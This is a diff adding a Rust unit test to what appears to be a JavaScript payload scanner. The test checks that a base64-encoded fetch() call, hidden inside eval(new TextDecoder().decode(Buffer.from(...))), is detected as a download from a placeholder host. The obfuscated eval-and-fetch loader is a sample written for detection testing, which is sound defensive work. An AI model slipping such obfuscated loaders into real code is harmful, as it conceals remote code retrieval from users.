@@ -14458,6 +14458,29 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_textdecoder_buffer_from_base64_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://textdecoder-buffer-base64-js.example/p')",
+        );
+        let js = format!(r#"eval(new TextDecoder().decode(Buffer.from("{encoded}", "base64")))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-buffer-base64-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder Buffer.from(base64) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_textdecoder_utf8_options_arg_uint8array_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://textdecoder-options-arg-js.example/p')";
